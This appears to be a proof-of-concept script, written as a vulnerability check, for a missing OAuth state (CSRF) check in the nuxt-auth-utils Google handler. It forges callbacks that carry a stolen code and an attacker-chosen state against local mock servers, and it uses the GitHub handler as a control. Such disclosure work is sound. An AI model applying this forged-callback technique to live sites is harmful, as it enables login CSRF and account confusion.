/*
 * Executable PoC: OAuth state (CSRF) not validated in nuxt-auth-utils providers.
 *
 * Runs the REAL, unmodified provider handlers from the installed package:
 *   - defineOAuthGoogleEventHandler  (claimed vulnerable: no state check)
 *   - defineOAuthGitHubEventHandler  (protected: validates state)
 *
 * against a mock OAuth token+userinfo server, and simulates an attacker-forged
 * callback:  GET /auth/<provider>?code=<stolen>&state=<attacker>   with NO valid
 * `nuxt-auth-state` cookie.
 *
 * PASS/FAIL:
 *   - If the google handler calls onSuccess() -> CSRF SUCCEEDED (no state check).
 *   - If the github handler rejects with "state mismatch" -> protected (control).
 */
import http from 'node:http'
import { createApp, toNodeListener, eventHandler } from 'h3'
import { $fetch } from 'ofetch'

// nuxt-auth-utils calls the global `$fetch` (provided by Nuxt/ofetch at runtime)
globalThis.$fetch = $fetch

const PKG = './node_modules/nuxt-auth-utils/dist/runtime/server/lib/oauth'
const { defineOAuthGoogleEventHandler } = await import(`${PKG}/google.js`)
const { defineOAuthGitHubEventHandler } = await import(`${PKG}/github.js`)

// ---- 1. Mock OAuth provider (token + userinfo endpoints) ----
const idp = http.createServer((req, res) => {
  if (req.url.startsWith('/token')) {
    res.setHeader('content-type', 'application/json')
    res.end(JSON.stringify({ access_token: 'ATTACKER_ACCESS_TOKEN', token_type: 'Bearer', expires_in: 3600 }))
  } else if (req.url.startsWith('/userinfo') || req.url.startsWith('/user')) {
    res.setHeader('content-type', 'application/json')
    res.end(JSON.stringify({ sub: 'attacker-123', id: 'attacker-123', email: 'attacker@evil.test', name: 'Attacker' }))
  } else {
    res.statusCode = 404; res.end('{}')
  }
})
await new Promise((r) => idp.listen(0, '127.0.0.1', r))
const idpPort = idp.address().port
const idpBase = `http://127.0.0.1:${idpPort}`

// ---- 2. App with the REAL handlers, pointed at the mock IdP ----
const results = {}
const mkCallbacks = (name) => ({
  onSuccess: (event, data) => {
    results[name] = { outcome: 'onSuccess', user: data.user?.email, token: data.tokens?.access_token }
    return { ok: true }
  },
  onError: (event, err) => {
    results[name] = { outcome: 'onError', message: err?.message }
    return { ok: false, error: err?.message }
  },
})

const googleConfig = {
  clientId: 'app-client-id', clientSecret: 'app-client-secret',
  tokenURL: `${idpBase}/token`, userURL: `${idpBase}/userinfo`,
  redirectURL: 'http://127.0.0.1/auth/google',
}
const githubConfig = {
  clientId: 'app-client-id', clientSecret: 'app-client-secret',
  tokenURL: `${idpBase}/token`, userURL: `${idpBase}/user`, emailURL: `${idpBase}/user`,
  redirectURL: 'http://127.0.0.1/auth/github',
}

const app = createApp()
app.use('/auth/google', defineOAuthGoogleEventHandler({ config: googleConfig, ...mkCallbacks('google') }))
app.use('/auth/github', defineOAuthGitHubEventHandler({ config: githubConfig, ...mkCallbacks('github') }))

const server = http.createServer(toNodeListener(app))
await new Promise((r) => server.listen(0, '127.0.0.1', r))
const appPort = server.address().port

// ---- 3. The attack: forged callback, NO nuxt-auth-state cookie ----
async function forgeCallback(provider) {
  results[provider] = { outcome: 'no-callback' }
  const url = `http://127.0.0.1:${appPort}/auth/${provider}?code=STOLEN_AUTH_CODE&state=attacker_chosen_value`
  try {
    // Deliberately send NO Cookie header (attacker's cross-site forged request)
    await $fetch(url, { headers: {}, ignoreResponseError: true })
  } catch { /* handler may throw; result recorded in callbacks */ }
  return results[provider]
}

console.log('Simulating attacker-forged OAuth callback (stolen code, attacker state, NO valid state cookie)\n')

const g = await forgeCallback('google')
console.log('GOOGLE  provider:', JSON.stringify(g))
if (g.outcome === 'onSuccess') {
  console.log('  => CSRF SUCCEEDED: onSuccess ran with attacker identity, NO state validation.\n')
}

const gh = await forgeCallback('github')
console.log('GITHUB  provider:', JSON.stringify(gh))
if (gh.outcome === 'onError' && /state mismatch/i.test(gh.message || '')) {
  console.log('  => Correctly REJECTED (state mismatch). This is the control showing the fix works.\n')
}

console.log('='.repeat(70))
const vuln = results.google?.outcome === 'onSuccess'
const control = results.github?.outcome === 'onError'
console.log(vuln && control
  ? 'RESULT: CONFIRMED. google accepts the forged callback (no state check); github rejects it.'
  : 'RESULT: inconclusive — check output above.')

server.close(); idp.close()
